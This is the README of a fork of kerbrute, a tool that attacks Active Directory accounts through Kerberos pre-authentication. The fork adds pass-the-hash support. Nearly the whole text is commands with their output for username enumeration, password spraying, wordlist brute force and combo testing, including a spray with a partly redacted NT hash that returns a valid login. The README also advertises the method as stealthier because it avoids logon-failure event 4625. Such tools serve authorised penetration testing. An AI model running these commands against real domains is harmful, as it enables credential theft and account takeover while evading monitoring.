# Kerbrute - With PTH

This is a fork from ropnop's [kerbrute](https://github.com/ropnop/kerbrute) so credit to him for the main program.
He hasn't updated anything in a while and I wanted this program to have:

-  PassTheHash support
-  Command-Line completion
-  To respect the KRB5_CONFIG like, everything else

It now has those things.


Notes: 
- Only NThashes have been tested, AES hashes should work, but it was low on the totem pool.
- Only bash completion has been tested you need the `bash-completion` package installed and then source the completion script installed or `mv kerbrute_completion.sh /etc/bash_completion.d/`

```bash
# KRB5_CONFIG is set, so I don't have to set -d or --dc
kerbrute passwordspray users.txt 5d8c3[redacted]60f469f6763ca0d50 --nthash -t1
2025/09/26 14:04:49 >  Using KDC(s):
2025/09/26 14:04:49 >   AWSJPDC0522.shibuya.vl:88

2025/09/26 14:04:51 >  [+] VALID LOGIN:  simon.watson@shibuya.vl:5d8c3[redacted]60f469f6763ca0d50
```

A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication

Grab the latest binaries from the [releases page](https://github.com/chin-tech/kerbrute/releases/latest) to get started.

## Benefits

Bruteforcing via kerberos is faster and stealthier. Pre-auth failures don't trigger `An account failed to logon` event 4625

## Usage
Kerbrute has three main commands:
 * **bruteuser** - Bruteforce a single user's password from a wordlist
 * **bruteforce** - Read username:password combos from a file or stdin and test them
 * **passwordspray** - Test a single password against a list of users
 * **userenum** - Enumerate valid domain usernames via Kerberos

A domain (`-d`) or a domain controller (`--dc`) must be specified. If a Domain Controller is not given the KDC will be looked up via DNS.

By default, Kerbrute is multithreaded and uses 10 threads. This can be changed with the `-t` option.

Output is logged to stdout, but a log file can be specified with `-o`.

By default, failures are not logged, but that can be changed with `-v`.

Lastly, Kerbrute has a `--safe` option. When this option is enabled, if an account comes back as locked out, it will abort all threads to stop locking out any other accounts.

The `help` command can be used for more information

```
$ ./kerbrute -h

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (bc1d606) - 11/15/20 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string          The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int          Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string      The full domain to use (e.g. contoso.com)
      --downgrade          Force downgraded encryption type (arcfour-hmac-md5)
      --hash-file string   File to save AS-REP hashes to (if any captured), otherwise just logged
  -h, --help               help for kerbrute
  -o, --output string      File to write logs to. Optional.
      --safe               Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int        Threads to use (default 10)
  -v, --verbose            Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

### User Enumeration
To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a `PRINCIPAL UNKNOWN` error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a Windows event ID [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) if Kerberos logging is enabled.

```
root@kali:~# ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:28:04 >  Using KDC(s):
2019/03/06 21:28:04 >   pdc01.lab.ropnop.com:88

2019/03/06 21:28:04 >  [+] VALID USERNAME:       amata@lab.ropnop.com
2019/03/06 21:28:04 >  [+] VALID USERNAME:       thoffman@lab.ropnop.com
2019/03/06 21:28:04 >  Done! Tested 1001 usernames (2 valid) in 0.425 seconds
```

### Password Spray
With `passwordspray`, Kerbrute will perform a horizontal brute force attack against a list of domain users. This is useful for testing one or two common passwords when you have a large list of users. WARNING: this does will increment the failed login count and lock out accounts. This will generate both event IDs [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) and [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

```
root@kali:~# ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:37:29 >  Using KDC(s):
2019/03/06 21:37:29 >   pdc01.lab.ropnop.com:88

2019/03/06 21:37:35 >  [+] VALID LOGIN:  callen@lab.ropnop.com:Password123
2019/03/06 21:37:37 >  [+] VALID LOGIN:  eshort@lab.ropnop.com:Password123
2019/03/06 21:37:37 >  Done! Tested 2755 logins (2 successes) in 7.674 seconds
```

### Brute User
This is a traditional bruteforce account against a username. Only run this if you are sure there is no lockout policy! This will generate both event IDs [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) and [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

```
root@kali:~# ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:38:24 >  Using KDC(s):
2019/03/06 21:38:24 >   pdc01.lab.ropnop.com:88

2019/03/06 21:38:27 >  [+] VALID LOGIN:  thoffman@lab.ropnop.com:Summer2017
2019/03/06 21:38:27 >  Done! Tested 1001 logins (1 successes) in 2.711 seconds
```

### Brute Force
This mode simply reads username and password combinations (in the format `username:password`) from a file or from `stdin` and tests them with Kerberos PreAuthentication. It will skip any blank lines or lines with blank usernames/passwords. This will generate both event IDs [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) and [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)
```
$ cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/11/19 - Ronnie Flathers @ropnop

2019/05/11 18:40:56 >  Using KDC(s):
2019/05/11 18:40:56 >   pdc01.lab.ropnop.com:88

2019/05/11 18:40:56 >  [+] VALID LOGIN:  athomas@lab.ropnop.com:Password1234
2019/05/11 18:40:56 >  Done! Tested 7 logins (1 successes) in 0.114 seconds
```

## Installing
You can download pre-compiled binaries for Linux, Windows and Mac from the [releases page](https://github.com/chin-tech/kerbrute/releases/tag/latest). If you want to live on the edge, you can also install with Go:

```
$ go get github.com/ropnop/kerbrute
```

With the repository cloned, you can also use the Make file to compile for common architectures:

```
$ make help
help:            Show this help.
windows:  Make Windows x86 and x64 Binaries
linux:  Make Linux x86 and x64 Binaries
mac:  Make Darwin (Mac) x86 and x64 Binaries
clean:  Delete any binaries
all:  Make Windows, Linux and Mac x86/x64 Binaries

$ make all
Done.
Building for windows amd64..
Building for windows 386..
Done.
Building for linux amd64...
Building for linux 386...
Done.
Building for mac amd64...
Building for mac 386...
Done.

$ ls dist/
kerbrute_darwin_386        kerbrute_linux_386         kerbrute_windows_386.exe
kerbrute_darwin_amd64      kerbrute_linux_amd64       kerbrute_windows_amd64.exe
```

## Credits
[jcmturner's gokrb5](https://github.com/jcmturner/gokrb5) - I also forked and edited to add hash support
[Ronnie Flathers](https://github.com/ropnop)  - Kerbrute creator

